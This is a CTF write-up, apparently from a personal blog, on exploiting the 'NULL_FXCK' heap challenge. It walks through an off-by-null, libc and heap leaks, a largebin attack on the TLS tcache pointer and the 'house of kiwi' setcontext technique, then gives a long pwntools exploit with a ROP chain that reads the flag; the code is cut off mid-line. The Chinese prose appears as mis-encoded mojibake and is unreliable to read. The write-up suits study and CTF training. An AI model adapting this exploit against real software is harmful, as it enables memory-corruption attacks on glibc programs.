id="æ²™ç®±å¼€å¯"><a href="#æ²™ç®±å¼€å¯" class="headerlink" title="æ²™ç®±å¼€å¯"></a>æ²™ç®±å¼€å¯</h4><p><img src="/img/article/house_of_kiwi/image-20221026134222730.png" alt="image-20221026134222730"></p><h4 id="ä¿æŠ¤å…¨å¼€"><a href="#ä¿æŠ¤å…¨å¼€" class="headerlink" title="ä¿æŠ¤å…¨å¼€"></a>ä¿æŠ¤å…¨å¼€</h4><p><img src="/img/article/house_of_kiwi/image-20221026134910200.png" alt="image-20221026134910200"></p><h4 id="ç¦ç”¨malloc-hook-free-hook"><a href="#ç¦ç”¨malloc-hook-free-hook" class="headerlink" title="ç¦ç”¨malloc_hook, free_hook"></a>ç¦ç”¨malloc_hook, free_hook</h4><p><img src="/img/article/house_of_kiwi/image-20221026135700420.png" alt="ban!!!"></p><h4 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h4><blockquote><p>æ•´ä¸ªç¨‹åºåªæœ‰åœ¨modifyé‡Œæœ‰ä¸€æ¬¡off by null çš„æœºä¼šï¼Œæ— å…¶ä»–æ¼æ´</p></blockquote><h3 id="æ€è·¯æ•´ç†"><a href="#æ€è·¯æ•´ç†" class="headerlink" title="æ€è·¯æ•´ç†"></a>æ€è·¯æ•´ç†</h3><p>è¿™é‡Œçš„æ€è·¯å…¶å®æœ‰ç‚¹å…¬å¼åŒ–çš„å‘³é“ï¼Œå°±å’Œæˆ‘ä»¬åšæ•°å­¦é¢˜ä¸€æ ·ï¼Œéƒ½æ˜¯é€šè¿‡é¢˜ç›®ç»™çš„æ¡ä»¶æ¥æ€è€ƒåˆ©ç”¨çš„æ‰‹æ³•ã€‚ç»™äº†off_by_nullå°±æ€è€ƒä¼šç”¨åˆ°å †å—çš„åˆå¹¶å¯¼è‡´çš„é‡å ã€‚é‡å å¸¦æ¥çš„å¥½å¤„ï¼š</p><ul><li>é€šè¿‡åˆ‡å‰²å †å—èƒ½ä½¿æˆ‘ä»¬åœ¨åˆå¹¶çš„å †å—å†…éƒ¨ä»»æ„åœ°å€å†™main_arenaï¼Œè¿™ä¸ªä»»æ„åœ°å€å¯èƒ½æ˜¯noteæ•°ç»„çš„ä¸€ä¸ªå †æŒ‡é’ˆçš„fdï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ³„éœ²libcäº†</li><li>åˆå¹¶çš„æ—¶å€™çš„unlinkèƒ½ä½¿å¾—æˆ‘ä»¬åœ¨å·²çŸ¥å †å—çš„fdå’Œbkä¸Šå†™ä¸€ä¸ªå †åœ°å€ï¼Œè¿™æ ·å°±å¯ä»¥å¼¥è¡¥ä¸€å¼€å§‹çš„æˆªæ–­å¸¦æ¥çš„ä¸èƒ½æ³„éœ²å †å—ï¼Œç„¶åæˆåŠŸæ³„éœ²å‡ºå †å—äº†</li></ul><h4 id="å †é£æ°´æ³„éœ²libcå’Œå †åœ°å€"><a href="#å †é£æ°´æ³„éœ²libcå’Œå †åœ°å€" class="headerlink" title="å †é£æ°´æ³„éœ²libcå’Œå †åœ°å€"></a>å †é£æ°´æ³„éœ²libcå’Œå †åœ°å€</h4><p>é¦–å…ˆä¼ªé€ ä¸€ä¸ªchunkå¤´ï¼Œåˆ©ç”¨off by null unlinkåå¹¶å‡ ä¸ªAllocatedçŠ¶æ€çš„chunk. ç„¶åaddåˆ†å‰²ä½¿å¾—chunkè¿›å…¥unsortedbinï¼Œä»è€Œæ³„éœ²libc. åŒæ—¶åŒ…å«ï¼Œlargebinä¸­æå‰åŒ…å«heapä¿¡æ¯ï¼Œä»è€Œæ³„éœ²heapåœ°å€</p><h4 id="house-of-wiki"><a href="#house-of-wiki" class="headerlink" title="house of wiki"></a>house of wiki</h4><p>å‘ç°è¿™é¢˜ä¸­çš„<code>exit</code>è¢«æ¢æˆäº†<code>_exit</code>ï¼Œè€Œ<code>_exit</code>æ˜¯ä¸ä¼šå­˜åœ¨<code>house of pig</code>é‡Œé¢çš„é‚£æ¡é“¾å­çš„ï¼Œå®ƒç›´æ¥å°±æ˜¯ä¸€ä¸ª<code>exit</code>çš„ç³»ç»Ÿè°ƒç”¨ç„¶åç¨‹åºå°±ç»“æŸäº†ï¼Œæ‰€ä»¥ä»»ä½•æ‰“<code>exit</code>çš„é“¾å­éƒ½ä¸èƒ½ç›´æ¥æ‹¿æ¥ç”¨ã€‚é‡åˆ°è¿™ç§é—®é¢˜ï¼Œæœ‰çš„å¸ˆå‚…å°±å¼€è¾Ÿäº†ä¸€æ¡åä¸º<code>house of kiwi</code>çš„é“¾å­ã€‚ä¸»è¦æ˜¯æ‰“<code>__malloc_assert</code>æ–­è¨€ï¼Œæœ‰ä¸€ä¸ªä½äº<code>_IO_file_jumps+0x60</code>çš„ç¨³å®šçš„è·³è½¬æŒ‡é’ˆ<code>sync</code>å’Œç¨³å®šçš„<code>rdxâ€”â€”_IO_helper_jumps</code>ï¼Œè€Œä¸”è¿™ä¸¤ä¸ªåœ°æ–¹åœ¨gdbé‡Œéƒ½æ˜¯æœ‰ç¬¦å·è¡¨çš„ï¼ˆæ¯”bananaå¥½æ‰¾å¤šäº†2333ï¼‰ï¼š</p><p><img src="/img/article/house_of_kiwi/image-20221026150024215.png" alt="åç§»ç¡®å®š"></p><p>é‚£ä¹ˆæˆ‘ä»¬é€šè¿‡ä¸¤æ¬¡ä»»æ„åœ°å€å†™å°±è¡Œäº†ï¼Ÿéä¹Ÿã€‚å› ä¸ºè¿˜éœ€è¦è§¦å‘assertï¼Œçœ‹çœ‹malloc.cçš„æºç ï¼Œctrl fè¾“å…¥â€assertâ€ã€‚å‘ç°æœ‰80å¤šä¸ªã€‚è¿™é‡Œä»‹ç»å…¶ä¸­ä¸€ç§åšæ³•ï¼šå½“top_chunkçš„å¤§å°ä¸å¤Ÿåˆ†é…æ—¶,åˆ™ä¼šè¿›å…¥sysmallocä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="hljs-number">0</span>) ||<br>        ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;<br>         prev_inuse (old_top) &amp;&amp;<br>         ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) old_end &amp; (pagesize - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure><p>å‘ç°å¾ˆå¤šæ£€æµ‹ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°å¯¹topchunkçš„prev_inuseçš„æ£€æµ‹ï¼Œåªè¦æŠŠtopchunkçš„sizeä½çš„prev_inuseç½®ä¸º0ï¼Œç”³è¯·ä¸€ä¸ªæ¯”å®ƒå¤§çš„å †å—å°±å¯ä»¥è§¦å‘äº†ã€‚æˆ‘ä»¬å‘ç°ï¼Œè‡³å°‘éœ€è¦æ”¹ä¸‰ä¸ªåœ°å€ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œä¸‰æ¬¡ä»»æ„åœ°å€å†™ã€‚ä»è¿™é“é¢˜çš„ä¸¥è‹›æ¡ä»¶ï¼Œä¸èƒ½ç”¨tcache poisonç­‰ç®€å•æ‰‹æ³•ã€‚</p><h4 id="TLSæ®µtcache-struct-attack"><a href="#TLSæ®µtcache-struct-attack" class="headerlink" title="TLSæ®µtcache struct attack"></a>TLSæ®µtcache struct attack</h4><p>æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œmalloc_initä¼šåœ¨heapbaseæ®µå¼€è®¾ä¸€ä¸ªå†…å­˜ç”¨äºç®¡ç†tcacheã€‚è€Œè¿™ä¸ªç®¡ç†tcacheçš„åœ°å€ï¼Œæ˜¯å¯ä»¥ä»heapbaseè¢«æˆ‘ä»¬åŠ«æŒåˆ°å¦ä¸€ä¸ªåœ°æ–¹çš„ï¼Œè¿™æ˜¯å› ä¸ºå®é™…å¯»æ‰¾çš„æ—¶å€™ï¼Œæ˜¯æ‰¾åˆ°TLSæ®µçš„ç®¡ç†tcacheçš„åœ°å€ï¼Œåªä¸è¿‡malloc_initå‡½æ•°é¢„è®¾æˆäº†heapbase+0x10è€Œå·²ï¼ˆæ³¨æ„ï¼Œæ˜¯heapbase+0x10è€Œä¸æ˜¯heapbaseï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨gdbä¸­æ‰¾åˆ°è¿™æ®µåŒºåŸŸï¼š</p><p><img src="/img/article/house_of_kiwi/image-20221026151700771.png" alt="image-20221026151700771"></p><p>é€šè¿‡<code>largebin attack</code>åŠ«æŒè¿™æ®µä¸ºå¯æ§å †å—ï¼Œåœ¨ä¸Šé¢å¸ƒç½®ä»»ä½•æˆ‘ä»¬æƒ³å†™çš„ä¸œè¥¿ï¼Œ<code>malloc</code>å¯¹åº”ä½ç½®sizeå¤§å°å°±èƒ½å¤Ÿç”³è¯·å‡ºæ¥å¹¶ä¸”æ”¹å†™äº†ï¼ˆè¿™é‡Œçš„åç§»è¦è°ƒä¸€è°ƒï¼Œä¸è¿‡ä¹Ÿå¯ä»¥æ‹¿expçš„æ¨¡æ¿ç›´æ¥æ¥ç”¨ï¼Œä¹Ÿå°±æ˜¯ï¼‰</p><p>é€šè¿‡æ”¹ç¨³å®šçš„è·³è¡¨syncä¸ºsetcontext+61(å› ä¸ºsetcontextä¼šå°†[rdx+0xa0]è®¾ç½®ä¸ºrspï¼Œå°†[rdx+0xa8]è®¾ç½®ä¸ºrip)ï¼Œå°†ç¨³å®šçš„rdx <code>_IO_helper_jumps</code>è®¾ç½®ä¸º<code>_IO_helper_jumps+0xa0</code>ä¸ºå­˜orwé“¾ï¼Œ+0xa8ä¸ºretæŒ‡ä»¤ï¼Œå¹¶æ”¹top_chunkçš„sizeï¼Œç„¶åç”³è¯·ä¸€ä¸ªæ¯”å®ƒçš„sizeå¤§çš„å †å—è§¦å‘assertå°±å¯get_shelläº†</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><blockquote><p>è¿™é“é¢˜è€ƒå¯Ÿäº†é«˜ç‰ˆæœ¬çš„off_by_nullï¼Œlarge bin attackï¼Œhouse of kiwi ï¼Œ TLS attack</p></blockquote><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> sys <br><span class="hljs-keyword">import</span> os <br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span> <br><span class="hljs-comment"># context.update( os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;,timeout = 1)</span><br>binary = <span class="hljs-string">&#x27;./NULL_FXCK&#x27;</span><br>os.system(<span class="hljs-string">&#x27;chmod +x %s&#x27;</span>%binary)<br>elf = ELF(binary)<br>libc = elf.libc<br><span class="hljs-comment"># libc = ELF(&#x27;&#x27;)</span><br>context.binary = binary<br>DEBUG = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> DEBUG:<br>    p = process(binary)<br>    libc = elf.libc<br>    <span class="hljs-comment"># p = process([&#x27;qemu-arm&#x27;, binary])</span><br>    <span class="hljs-comment"># p = process([&#x27;qemu-arm&#x27;, binary,&#x27;-g&#x27;,&#x27;1234&#x27;])</span><br>    <span class="hljs-comment"># p = process([&#x27;qemu-aarch64&#x27;,&#x27;-L&#x27;,&#x27;&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,binary])</span><br><span class="hljs-keyword">else</span>:<br>    host = <span class="hljs-string">&#x27;&#x27;</span><br>    port = <span class="hljs-string">&#x27;&#x27;</span><br>    p = remote(host,port)<br><br>l64 = <span class="hljs-keyword">lambda</span>            : u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>l32 = <span class="hljs-keyword">lambda</span>            : u32(p.recvuntil(<span class="hljs-string">&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>sla = <span class="hljs-keyword">lambda</span> a,b        : p.sendlineafter(<span class="hljs-built_in">str</span>(a),<span class="hljs-built_in">str</span>(b))<br>sa  = <span class="hljs-keyword">lambda</span> a,b        : p.sendafter(<span class="hljs-built_in">str</span>(a),<span class="hljs-built_in">str</span>(b))<br>lg  = <span class="hljs-keyword">lambda</span> name,data  : p.success(name + <span class="hljs-string">&#x27;: 0x%x&#x27;</span> % data)<br>se  = <span class="hljs-keyword">lambda</span> payload    : p.send(payload)<br>rl  = <span class="hljs-keyword">lambda</span>            : p.recv()<br>sl  = <span class="hljs-keyword">lambda</span> payload    : p.sendline(payload)<br>ru  = <span class="hljs-keyword">lambda</span> a          : p.recvuntil(<span class="hljs-built_in">str</span>(a))<br>rint= <span class="hljs-keyword">lambda</span> x = <span class="hljs-number">12</span>     : <span class="hljs-built_in">int</span>( p.recv(x) , <span class="hljs-number">16</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params"> b = null</span>):<br>    <span class="hljs-keyword">if</span> (b == null):<br>        gdb.attach(p)<br>        pause()<br>    <span class="hljs-keyword">else</span>:<br>        gdb.attach(p,<span class="hljs-string">&#x27;b %s&#x27;</span>%b)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">one_gadget</span>(<span class="hljs-params">filename</span>):<br>    log.progress(<span class="hljs-string">&#x27;Leak One_Gadgets...&#x27;</span>)<br>    one_ggs = <span class="hljs-built_in">str</span>(subprocess.check_output(<br>        [<span class="hljs-string">&#x27;one_gadget&#x27;</span>,<span class="hljs-string">&#x27;--raw&#x27;</span>, <span class="hljs-string">&#x27;-f&#x27;</span>,filename]<br>    )).split(<span class="hljs-string">&#x27; &#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>,one_ggs))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">num</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,num)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size , Content = <span class="hljs-string">&#x27;\x00&#x27;</span></span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span> , size)<br>    sa(<span class="hljs-string">&#x27;Content:&#x27;</span> , Content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , Content</span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span> , idx)<br>    sla(<span class="hljs-string">&#x27;Content:&#x27;</span> , Content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx </span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span> , idx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx </span>):<br>    cmd(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span> , idx)<br><br><br><span class="hljs-comment"># one_gad = one_gadget(libc.path)</span><br><span class="hljs-comment"># æœ¬è´¨æ˜¯é€šè¿‡ unsorted bin æˆ–è€… large bin çš„æŒ‡é’ˆæ®‹ç•™æ„é€  unlink çš„æŒ‡é’ˆæŒ‡å‘</span><br><br>add(<span class="hljs-number">0x418</span>)<br>add(<span class="hljs-number">0x108</span>)<br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x438</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x208</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x428</span>) <span class="hljs-comment">#5</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#6</span><br><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">5</span>)<br><br>delete(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># unsorted bin åˆå¹¶ ï¼Œä½†åˆå¹¶ä¸ä¼šæ¸…ç©ºæ•°æ®ï¼ŒæŸå¤„æœ‰æ®‹ç•™çš„å †åœ°å€</span><br><br>add(<span class="hljs-number">0x438</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x418</span> +  p64( <span class="hljs-number">0x420</span> + <span class="hljs-number">0x210</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x420</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">1</span>)) <span class="hljs-comment">#0</span><br><br><span class="hljs-comment"># 0xa91 å†™åˆ°äº†åŸæ¥ chunk3 çš„ size å¤„ï¼Œåˆšå¥½è¿™ä¸‹é¢æœ‰æ®‹ç•™çš„å †åœ°å€</span><br><span class="hljs-comment"># åˆ‡å‰²å·²ç»åˆå¹¶çš„å¤§å—</span><br><span class="hljs-comment"># unsorted bin ä»æ–°åˆ°æ—§æ’åº</span><br><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x428</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#5</span><br><br><span class="hljs-comment"># ä¸‹é¢æ„é€  fack fd </span><br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x418</span> , <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">9</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#5</span><br><br><span class="hljs-comment"># ä¸‹é¢æ„é€  fack bk</span><br><br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">3</span>)<br><br>add(<span class="hljs-number">0x9f8</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x428</span> , <span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#5</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#7</span><br><br><span class="hljs-comment"># ä¸‹é¢è¿›è¡Œ unlink</span><br>add(<span class="hljs-number">0x408</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x411</span>)) <span class="hljs-comment">#8</span><br>edit(<span class="hljs-number">6</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x410</span> + p64(<span class="hljs-number">0x210</span> +<span class="hljs-number">0x430</span> + <span class="hljs-number">0x420</span> + <span class="hljs-number">0x420</span> + <span class="hljs-number">0x20</span> ))<br>delete(<span class="hljs-number">3</span>)<br><br>add(<span class="hljs-number">0x438</span> , flat(<span class="hljs-number">0</span> , <span class="hljs-number">0</span> ,<span class="hljs-number">0</span> , <span class="hljs-number">0x421</span>)) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x1600</span>) <span class="hljs-comment">#9</span><br><br>show(<span class="hljs-number">4</span>)<br>__malloc_hook = l64() - <span class="hljs-number">1644</span> - <span class="hljs-number">0x40</span> - <span class="hljs-number">4</span><br>libc.address = __malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>_environ = libc.sym[<span class="hljs-string">&#x27;_environ&#x27;</span>]<br>mp_ = libc.address + <span class="hljs-number">0x1e3280</span><br>_IO_list_all = libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>_IO_str_jumps = libc.address + <span class="hljs-number">0x1e5580</span><br>_IO_file_jumps = libc.address + <span class="hljs-number">0x1e54c0</span><br>_IO_helper_jumps = libc.address + <span class="hljs-number">0x1e48c0</span><br>setcontext = libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">61</span><br><br>show(<span class="hljs-number">5</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust( <span class="hljs-number">8</span> , <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x2b0</span><br><br>ptr_list = <span class="hljs-number">0x4160</span><br>lg(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span> , __malloc_hook)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br><br><span class="hljs-comment"># ptr_list = $rebase(0x000000000004160)</span><br><br>add(<span class="hljs-number">0x1458</span> , flat(<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x208</span> , <span class="hljs-number">0x431</span> , <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x428</span> , <span class="hljs-number">0x421</span> , <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x418</span> , <span class="hljs-number">0xa01</span>) )<br><br>delete(<span class="hljs-number">4</span>)<br>delete(<span class="hljs-number">5</span>)<br><br>add(<span class="hljs-number">0x1458</span>  )<br>add(<span class="hljs-number">0x448</span>)<br><br>delete(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">0x1458</span> , flat(<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x208</span> , <span class="hljs-number">0x431</span> , __malloc_hook + <span class="hljs-number">0x460</span>,__malloc_hook + <span class="hljs-number">0x460</span> , <span class="hljs-number">0</span> , _IO_list_all - <span class="hljs-number">0x20</span> ) )<br><br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x448</span>)<br>add(<span class="hljs-number">0x418</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x438</span> , <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x2c0</span> + p64(_IO_file_jumps + <span class="hljs-number">96</span>) + <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x98</span> + flat(_IO_helper_jumps + <span class="hljs-number">0xa0</span> , heap_base + <span class="hljs-number">0x4bb0</span> ) ) <span class="hljs-comment">#è®¾ç½® entry</span><br><br>delete(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">0x1458</span> , flat(<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x208</span> , <span class="hljs-number">0x431</span> , __malloc_hook + <span class="hljs-number">0x460</span>,__malloc_hook + <span class="hljs-number">0x460</span> , <span class="hljs-number">0</span> , mp_ + <span class="hljs-number">80</span> - <span class="hljs-number">0x20</span> ) )<br>delete(<span class="hljs-number">11</span>)<br><br><br>read_addr = libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>open_addr = libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>puts_addr = libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>leave_ret = libc.search(asm(<span class="hljs-string">&#x27;leave;ret&#x27;</span>)).<span class="hljs-built_in">next</span>()<br>pop_rax_ret = libc.search(asm(<span class="hljs-string">&#x27;pop rax; ret&#x27;</span>)).<span class="hljs-built_in">next</span>()<br>pop_rdi_ret = libc.search(asm(<span class="hljs-string">&#x27;pop rdi; ret&#x27;</span>)).<span class="hljs-built_in">next</span>()<br>pop_rsi_ret = libc.search(asm(<span class="hljs-string">&#x27;pop rsi; ret&#x27;</span>)).<span class="hljs-built_in">next</span>()<br>pop_rdx_pop_rbx_ret = libc.search(asm(<span class="hljs-string">&#x27;pop rdx ; pop rbx ; ret&#x27;</span>)).<span class="hljs-built_in">next</span>()<br>ret = pop_rdi_ret + <span class="hljs-number">1</span><br><br>flag_addr = heap_base + <span class="hljs-number">0x4770</span> + <span class="hljs-number">0x100</span><br>chain = flat(<br>    pop_rdi_ret , flag_addr , pop_rsi_ret , <span class="hljs-number">0</span> , open_addr,<br>    pop_rdi_ret , <span class="hljs-number">3</span> , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , <span class="hljs-number">0x100</span> , <span class="hljs-number">0</span> , read_addr,<br>    pop_rdi_ret , flag_addr , puts_addr<br>).ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>) + <span class="hljs-string">&#x27;flag\x00&#x27;</span><br><span class="hljs-comment"># len chain 0x80</span><br><br><span class="hljs-comment"># dbg()</span><br>add(<span class="hljs-number">0x448</span> , chain) <span class="hljs-comment"># copy</span><br>add(<span class="hljs-number">0x418</span>)<br><br><span class="hljs-comment"># House of kiwi ä¸‰å¤§æ¡ä»¶</span><br><br><br>add(<span class="hljs-number">0x1450</span> , p64(setcontext)[:-<span class="hljs-number">1</span>])<br><br>add(<span class="hljs-number">0x1590</span> , flat( heap_base + <span class="hljs-number">0x4770</span> , ret ))<br>add(<span class="hljs-number">0x15a0</span> , flat( <span class="hljs-number">0</span> , <span 